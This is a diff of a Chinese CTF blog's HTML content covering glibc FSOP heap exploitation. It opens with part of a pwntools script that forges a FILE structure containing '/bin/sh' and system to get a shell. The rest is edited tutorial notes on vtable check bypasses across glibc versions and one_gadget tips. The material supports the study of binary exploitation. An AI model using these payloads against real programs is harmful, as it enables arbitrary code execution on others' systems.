class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xe0</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br>vtable_addr = heap_base + <span class="hljs-number">0x5e8</span><br>stream = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="hljs-number">0x61</span>)<br>stream += p64(<span class="hljs-number">0</span>) + p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>stream = stream.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&quot;\x00&quot;</span>)<br>stream += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># mode&lt;=0</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64(vtable_addr)<br>stream += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>stream += p64(sys)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>payload += stream<br>edit(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h3 id="高版本的下的FSOP"><a href="#高版本的下的FSOP" class="headerlink" title="高版本的下的FSOP"></a>高版本的下的FSOP</h3><h4 id="glibc-2-24-2-27"><a href="#glibc-2-24-2-27" class="headerlink" title="glibc-2.24~2.27"></a>glibc-2.24~2.27</h4><p>在<code>glibc-2.27</code>以及之后的源码中，<code>abort</code>中没有刷新流的操作，要通过 exit 函数调用<code>_IO_flush_all_lockp</code>来刷新<code>_IO_list_all</code> 链表中所有项的文件流，exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;stderr。。。</p>
-<p>所以需要去劫持 stderr + 0x68 成堆上布置的 fake_io</p>
-<p>注：有个2.27 Ubuntu1.4的版本跟更高版本的glibc差不多，所以是不包括这个版本的。</p>
+<h3 id="高版本的下的FSOP"><a href="#高版本的下的FSOP" class="headerlink" title="高版本的下的FSOP"></a>高版本的下的FSOP</h3><h4 id="glibc-2-24-2-27"><a href="#glibc-2-24-2-27" class="headerlink" title="glibc-2.24~2.27"></a>glibc-2.24~2.27</h4><p>在<code>glibc-2.27</code>以及之后的源码中，<code>abort</code>中没有刷新流的操作，改用调用 exit 函数或者正常从 main 返回，执行<code>_IO_flush_all_lockp</code>来刷新<code>_IO_list_all</code> 链表中所有项的文件流，exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;…</p>
 <p>对 vtable 指向的地址进行检查，检查地址是否落在 glibc 中的 vtable 段中，<code>__start___libc_IO_vtables</code>指向第一个vtable地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">const</span> struct _IO_jump_t *</span><br><span class="hljs-function"><span class="hljs-title">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> struct _IO_jump_t *vtable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ptr = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *) vtable;<br>  <span class="hljs-keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//检查vtable指针是否在glibc的vtable段中。</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -1012,7 +1132,7 @@ struct timezone
 <p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220317233212853.png"><span class="image-caption">image-20220317233212853</span></p>
 <figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-keyword">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="hljs-comment">//执行函数 call qword ptr [fp+0xE8h]</span><br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  <br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
-<p>可以看见，如果满足条件，将直接把<code>fp-&gt;_s._free_buffer</code>当作函数指针来调用。那么，只要在之前低版本布置的vtable 写上的是<code>_IO_str_jumps-8</code>的地址，这样就会使得 _IO_str_finish 成为了伪造的vtable地址的 _IO_OVERFLOW 函数，并且这个地址是在 vtable 段中的，可以满足检查。</p>
+<p>可以看见，如果满足条件，将直接把<code>fp-&gt;_s._free_buffer</code>当作函数指针来调用。那么，只要在之前低版本布置的vtable 修改为<code>_IO_str_jumps-8</code>，这样就会使得 _IO_str_finish 成为了伪造的vtable地址的 _IO_OVERFLOW 函数，并且这个地址是在 vtable 段中的，可以满足检查。</p>
 <p>然后去构造 fp-&gt;_IO_buf_base 为 “/bin/sh\x00”的地址，即可满足判断条件，同时也满足了后面作为参数的需求。</p>
 <p>接着构造 fp-&gt;_flags 不包含 _IO_USER_BUF 。它的定义为<code>#define _IO_USER_BUF 1</code>， 即 fp-&gt;_flags 最低位为0即可 。</p>
 <p>最后把 fp-&gt;_s._free_buffer 修改为 system 或者 one_gadget 。</p>
@@ -1034,10 +1154,9 @@ struct timezone
 </ul>
 <p><img src="/2021/11/06/2021-11-06-IO-FLIE/t01e8528e095b25d09d.png"><span class="image-caption">img</span></p>
 <p>glibc-2.28 中直接使用 malloc 和 free 替换掉原来在 _IO_str_fields 里的 <code>_allocate_buffer</code> 和 <code>_free_buffer</code>。因而不再使用偏移，无法再利用 __libc_IO_vtables 上的 vtable 绕过检查，于是上面的利用技术都失效了。</p>
-<h4 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc-2.29"></a>glibc-2.29</h4><p>glibc2.23中我们伪造vtable是因为其不可写，但是在glibc2.29中，vtable是可写的</p>
-<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220429212453016.png"><span class="image-caption">image-20220429212453016</span></p>
-<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220429212502415.png"><span class="image-caption">image-20220429212502415</span></p>
-<p>因此可以直接覆写_IO_file_jumps</p>
+<h4 id="glibc-2-29-2-34-0ubuntu3"><a href="#glibc-2-29-2-34-0ubuntu3" class="headerlink" title="glibc-2.29~2.34 0ubuntu3"></a>glibc-2.29~2.34 0ubuntu3</h4><p>glibc-2.24中我们伪造vtable是因为其不可写，但是在 glibc-2.29~2.34 0ubuntu3中，vtable是可写的</p>
+<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220824163622145.png"><span class="image-caption">image-20220824163622145</span></p>
+<p>因此可以选择覆盖_IO_file_jumps</p>
 <p>参考文章：</p>
 <p><a href="https://www.jianshu.com/p/2e00afb01606">https://www.jianshu.com/p/2e00afb01606</a></p>
 <p><a href="https://blog.csdn.net/A951860555/article/details/116425824">https://blog.csdn.net/A951860555/article/details/116425824</a></p>
@@ -2378,7 +2497,7 @@ struct timezone
 <li>需要有溢出漏洞可以修改物理相邻的高地址的 prev_size 与 INUSE 部分。</li>
 <li>在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
 </ul>
-<h2 id="House-Of-Lore"><a href="#House-Of-Lore" class="headerlink" title="House_Of_Lore"></a>House_Of_Lore</h2><h2 id="House-Of-Rabbit"><a href="#House-Of-Rabbit" class="headerlink" title="House_Of_Rabbit"></a>House_Of_Rabbit</h2>]]></content>
+]]></content>
       <tags>
         <tag>heap</tag>
       </tags>
@@ -3410,6 +3529,7 @@ struct timezone
 <li>rtld_unlock = libc_base + 0x619F68</li>
 </ul>
 <p>注：上述只是2.23，2.27的libc版本，但是同2.23，2.27的libc其实还有小版本类型，但是不变的是都在<code>_rtld_global+3840</code>的地址</p>
+<p>适用范围 glibc-2.23~glibc-2.34ubuntu3，直到 glibc-2.34ubuntu3.2 地址不可写了，才正式宣告失效。</p>
 <p>26、libc-2.27.so的unlink要先把tcache bin填满才能用，unlink要保证<code>unsorted bin是空的</code>，所以有时候泄露信息用了unsorted bin，要申请回来</p>
 <p>27、当我们申请一个大于 top chunk 的堆块时，程序会调用 mmap 进行内存分配，分配下来堆块的地址是libc中的地址</p>
 <p>28、libc-2.27堆的orw：利用setcontext+53的指令，把setcontext+53的地址一般写在__free_hook上，而shellcode写在堆上，然后进行释放堆块从而执行orw</p>
@@ -3433,6 +3553,10 @@ struct timezone
 </li>
 </ul>
 <p>​                    <img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220310192041331.png"><span class="image-caption">image-20220310192041331</span></p>
+<ul>
+<li>FSOP的利用，2.31及以上的主要用法。</li>
+</ul>
+<p>35、小技巧：在使用 one_gadget 时，可以先用 0xcafebabedeadbeef 填充，然后直接 c 就会让程序 down 在调用的位置，可以直接查看寄存器的值。</p>
 ]]></content>
       <tags>
         <tag>heap</tag>
